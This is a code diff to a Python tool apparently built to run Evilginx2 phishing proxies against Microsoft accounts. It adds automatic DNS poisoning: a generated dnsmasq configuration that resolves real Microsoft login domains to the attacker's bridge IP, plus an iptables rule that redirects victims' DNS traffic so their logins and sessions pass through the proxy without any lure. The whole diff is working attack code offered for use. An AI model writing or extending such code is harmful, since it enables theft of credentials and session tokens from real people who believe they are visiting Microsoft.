@@ -567,10 +567,12 @@ class EvilginxManager:
         self.db_path = CONFIG['EVILGINX_DB']
         self.config_dir = CONFIG['EVILGINX_CONFIG']
         self.process = None
+        self.dnsmasq_process = None
         self.running = False
         self.bridge_ip = CONFIG['BRIDGE_IP']
         self.phishlet = None
         self.lure_url = None
+        self.domains_to_poison = []
         self.sessions = []
         self.monitor_thread = None
         self.stop_monitoring = False
@@ -631,12 +633,27 @@ redirect_url: https://www.microsoft.com
             if not domain:
                 if phishlet == 'o365':
                     domain = 'login.microsoftonline.com'
-                    log("Using REAL domain for DNS poisoning: login.microsoftonline.com")
+                    # Poison multiple Microsoft auth domains
+                    self.domains_to_poison = [
+                        'login.microsoftonline.com',
+                        'account.microsoft.com',
+                        'login.microsoft.com',
+                        'portal.office.com'
+                    ]
+                    log("Using REAL domains for DNS poisoning")
                 elif phishlet == 'outlook':
                     domain = 'login.live.com'
-                    log("Using REAL domain for DNS poisoning: login.live.com")
+                    self.domains_to_poison = [
+                        'login.live.com',
+                        'account.live.com',
+                        'outlook.live.com'
+                    ]
+                    log("Using REAL domains for DNS poisoning")
                 else:
                     domain = f'{phishlet}.local'
+                    self.domains_to_poison = [domain]
+            else:
+                self.domains_to_poison = [domain]
             
             self.phishlet = phishlet
             
@@ -711,6 +728,10 @@ phishlets enable {phishlet}
                 self.running = True
                 self.lure_url = f"http://{domain}"
                 
+                # Setup automatic DNS poisoning
+                if not self.setup_dns_poisoning():
+                    log("WARNING: DNS poisoning setup failed - manual configuration needed", 'WARNING')
+                
                 # Start session monitoring
                 self.stop_monitoring = False
                 self.monitor_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
@@ -718,14 +739,15 @@ phishlets enable {phishlet}
                 
                 log(f"Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
                 log(f"Phishlet: {phishlet}")
-                log(f"Domain: {domain} (poison DNS to point here)")
+                log(f"Primary domain: {domain}")
                 log(f"Bridge IP: {self.bridge_ip}")
                 log(f"")
-                log(f"FOR DNS POISONING ATTACK:", 'INFO')
-                log(f"1. Configure DNS to resolve {domain} -> {self.bridge_ip}")
-                log(f"2. User visits Microsoft normally")
-                log(f"3. DNS redirects to your Evilginx")
-                log(f"4. Session captured after auth")
+                log(f"DNS POISONING ACTIVE:", 'SUCCESS')
+                log(f"  Intercepting DNS queries for:")
+                for d in self.domains_to_poison:
+                    log(f"    - {d} -> {self.bridge_ip}")
+                log(f"  Victim traffic automatically redirected to Evilginx")
+                log(f"  No lure needed - user visits Microsoft normally")
                 return True
             else:
                 log("Evilginx2 failed to start - check logs", 'ERROR')
@@ -738,6 +760,73 @@ phishlets enable {phishlet}
             log(traceback.format_exc(), 'ERROR')
             return False
 
+    def setup_dns_poisoning(self):
+        """Setup automatic DNS poisoning for Microsoft domains"""
+        try:
+            log("Setting up automatic DNS poisoning...")
+            
+            # Create dnsmasq config for poisoning
+            dnsmasq_conf = f"/tmp/evilginx-dnsmasq.conf"
+            
+            with open(dnsmasq_conf, 'w') as f:
+                f.write(f"# Evilginx DNS Poisoning\n")
+                f.write(f"interface={CONFIG['BRIDGE_NAME']}\n")
+                f.write(f"bind-interfaces\n")
+                f.write(f"listen-address={self.bridge_ip}\n")
+                f.write(f"port=5353\n")  # Use non-standard port, redirect with iptables
+                f.write(f"\n")
+                
+                # Poison Microsoft domains
+                for domain in self.domains_to_poison:
+                    f.write(f"address=/{domain}/{self.bridge_ip}\n")
+                
+                # Pass through all other queries
+                f.write(f"\n# Upstream DNS\n")
+                f.write(f"server=8.8.8.8\n")
+                f.write(f"server=1.1.1.1\n")
+            
+            log(f"DNS config created: {dnsmasq_conf}")
+            
+            # Kill any existing dnsmasq for evilginx
+            run_cmd(['pkill', '-f', 'dnsmasq.*evilginx'])
+            time.sleep(1)
+            
+            # Start dnsmasq
+            self.dnsmasq_process = subprocess.Popen(
+                ['dnsmasq', '-C', dnsmasq_conf, '--no-daemon'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setpgrp
+            )
+            
+            time.sleep(1)
+            
+            if self.dnsmasq_process.poll() is None:
+                log(f"DNS server started (PID: {self.dnsmasq_process.pid})")
+            else:
+                log("DNS server failed to start", 'WARNING')
+                return False
+            
+            # Redirect DNS queries to our dnsmasq
+            result = run_cmd([
+                'iptables', '-t', 'nat', '-A', 'PREROUTING',
+                '-i', CONFIG['BRIDGE_NAME'],
+                '-p', 'udp', '--dport', '53',
+                '-j', 'DNAT', '--to', f"{self.bridge_ip}:5353"
+            ])
+            
+            if result and result.returncode == 0:
+                log("DNS traffic redirected to poisoning server", 'SUCCESS')
+            else:
+                log("DNS redirect may have failed", 'WARNING')
+            
+            log(f"DNS poisoning active for {len(self.domains_to_poison)} domains", 'SUCCESS')
+            return True
+            
+        except Exception as e:
+            log(f"DNS poisoning setup failed: {e}", 'ERROR')
+            return False
+
     def stop(self):
         """Stop Evilginx2"""
         log("Stopping Evilginx2...")
@@ -747,6 +836,25 @@ phishlets enable {phishlet}
             self.monitor_thread.join(timeout=5)
         
         try:
+            # Stop DNS poisoning
+            if self.dnsmasq_process:
+                try:
+                    self.dnsmasq_process.terminate()
+                    self.dnsmasq_process.wait(timeout=3)
+                except:
+                    self.dnsmasq_process.kill()
+                self.dnsmasq_process = None
+                log("DNS poisoning stopped")
+            
+            # Remove DNS redirect rule
+            run_cmd([
+                'iptables', '-t', 'nat', '-D', 'PREROUTING',
+                '-i', CONFIG['BRIDGE_NAME'],
+                '-p', 'udp', '--dport', '53',
+                '-j', 'DNAT', '--to', f"{self.bridge_ip}:5353"
+            ])
+            
+            # Stop Evilginx
             if self.process:
                 # Send quit command
                 try:
@@ -769,6 +877,7 @@ phishlets enable {phishlet}
             self.running = False
             self.phishlet = None
             self.lure_url = None
+            self.domains_to_poison = []
             log("Evilginx2 stopped", 'SUCCESS')
             return True
             
